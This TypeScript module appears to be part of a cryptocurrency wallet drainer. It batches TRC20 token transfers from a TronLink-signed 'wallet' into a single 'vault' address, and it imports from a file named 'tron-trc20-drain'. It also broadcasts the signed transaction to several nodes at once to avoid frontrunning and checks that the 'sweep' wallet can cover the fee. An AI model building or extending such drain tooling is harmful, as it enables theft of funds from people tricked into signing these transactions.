/**
 * Tron settlement enhancements — batch TRC20, dynamic fee limit, multi-node shield broadcast.
 */
import { resolveTronSensoryFullHost, tronProApiHeaders } from './tron-sensory-armor.js'
import type { Trc20TransferRequest } from './tron-trc20-drain.js'

export type Trc20BatchLeg = {
  contract: string
  amount: bigint
}

async function createTronWeb(fullHost: string) {
  const { TronWeb } = await import('tronweb')
  const headers = tronProApiHeaders()
  return headers != null
    ? new TronWeb({ fullHost, headers })
    : new TronWeb({ fullHost })
}

/** Dynamic fee limit: base + per-contract energy estimate. Override via TRON_FEE_LIMIT env. */
export function calculateTronFeeLimit(contractCount: number): number {
  const explicit = process.env['TRON_FEE_LIMIT']?.trim()
  if (explicit && /^\d+$/.test(explicit)) {
    return Number(explicit)
  }
  const perContract = 35_000_000
  const base = 15_000_000
  return Math.min(base + contractCount * perContract, 150_000_000)
}

export function isTronShieldEnabled(): boolean {
  const v = process.env['TRON_SHIELD']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isTronSweepCapitalEnabled(): boolean {
  const v = process.env['TRON_SWEEP_CAPITAL']?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

function resolveTronShieldNodes(): string[] {
  const nodes = [
    process.env['TRON_FULL_NODE_URL']?.trim(),
    process.env['TRON_BACKUP_NODE']?.trim(),
    process.env['TRON_SHIELD_NODE_2']?.trim(),
    process.env['TRON_SHIELD_NODE_3']?.trim(),
    'https://api.trongrid.io',
  ].filter((v): v is string => Boolean(v && v.trim()))
  return [...new Set(nodes.map((n) => n.replace(/\/+$/, '')))]
}

/**
 * Build unsigned batch TRC-20 transfer tx (multiple contracts in one Tron transaction).
 */
export async function batchTransferTrc20(params: {
  wallet: string
  vault: string
  transfers: Trc20BatchLeg[]
  rpcUrl?: string
}): Promise<Trc20TransferRequest> {
  const legs = params.transfers.filter((t) => t.amount > 0n)
  if (legs.length === 0) {
    throw new Error('batchTransferTrc20 requires at least one positive transfer')
  }

  const fullHost = params.rpcUrl?.trim() || resolveTronSensoryFullHost()
  const tronWeb = await createTronWeb(fullHost)
  const feeLimit = calculateTronFeeLimit(legs.length)

  let txEnvelope: { transaction?: Record<string, unknown> } | null = null

  for (const leg of legs) {
    const parameter = [
      { type: 'address', value: params.vault },
      { type: 'uint256', value: leg.amount.toString() },
    ]
    const options: Record<string, unknown> = { feeLimit, callValue: 0 }
    if (txEnvelope?.transaction) {
      options['txLocal'] = txEnvelope.transaction
    }

    txEnvelope = (await tronWeb.transactionBuilder.triggerSmartContract(
      leg.contract,
      'transfer(address,uint256)',
      options,
      parameter,
      params.wallet,
    )) as unknown as { transaction?: Record<string, unknown> }
  }

  const tx = txEnvelope?.transaction
  if (tx == null || typeof tx !== 'object') {
    throw new Error('TronGrid did not return a batch TRC-20 transfer transaction')
  }

  return {
    from: params.wallet,
    to: params.vault,
    contract: legs.length === 1 ? legs[0]!.contract : 'batch',
    amount: legs.map((l) => l.amount.toString()).join(','),
    unsignedTransaction: tx,
    wallet: 'tronlink',
  }
}

/**
 * Broadcast signed Tron tx via multiple nodes simultaneously (TRON_SHIELD).
 * Returns first successful txid; reduces single-node frontrun exposure.
 */
export async function broadcastTronShield(params: {
  signedTransaction: Record<string, unknown>
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  const nodes = resolveTronShieldNodes()
  if (nodes.length === 0) {
    return { ok: false, detail: 'No Tron nodes configured for TRON_SHIELD' }
  }

  const attempts = await Promise.allSettled(
    nodes.map(async (fullHost) => {
      const tronWeb = await createTronWeb(fullHost)
      const response = (await tronWeb.trx.sendRawTransaction(
        params.signedTransaction as unknown as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
      )) as unknown as { result?: boolean; txid?: string; message?: string; code?: string }

      if (response.result === false) {
        throw new Error(response.message ?? response.code ?? 'TRON broadcast rejected')
      }
      if (!response.txid) throw new Error('TRON broadcast returned no txid')
      return response.txid
    }),
  )

  for (const attempt of attempts) {
    if (attempt.status === 'fulfilled') {
      return { ok: true, tx_hash: attempt.value }
    }
  }

  const detail = attempts
    .filter((a): a is PromiseRejectedResult => a.status === 'rejected')
    .map((a) => (a.reason instanceof Error ? a.reason.message : String(a.reason)))
    .join('; ')
  return { ok: false, detail: detail || 'TRON_SHIELD broadcast failed on all nodes' }
}

/**
 * When TRON_SWEEP_CAPITAL is enabled, verify execution wallet has enough TRX for feeLimit.
 * Does not flashloan — uses existing USDT/TRX balance in execution wallet.
 */
export async function assertTronSweepCapital(params: {
  wallet: string
  feeLimitSun: number
  rpcUrl?: string
}): Promise<{ ok: boolean; balanceSun?: bigint; detail?: string }> {
  if (!isTronSweepCapitalEnabled()) {
    return { ok: true }
  }

  const fullHost = params.rpcUrl?.trim() || resolveTronSensoryFullHost()
  try {
    const tronWeb = await createTronWeb(fullHost)
    const balanceSun = BigInt(await tronWeb.trx.getBalance(params.wallet))
    if (balanceSun < BigInt(params.feeLimitSun)) {
      return {
        ok: false,
        balanceSun,
        detail: `TRON_SWEEP_CAPITAL: wallet balance ${balanceSun} sun < feeLimit ${params.feeLimitSun}`,
      }
    }
    return { ok: true, balanceSun }
  } catch (e) {
    return { ok: false, detail: e instanceof Error ? e.message : String(e) }
  }
}
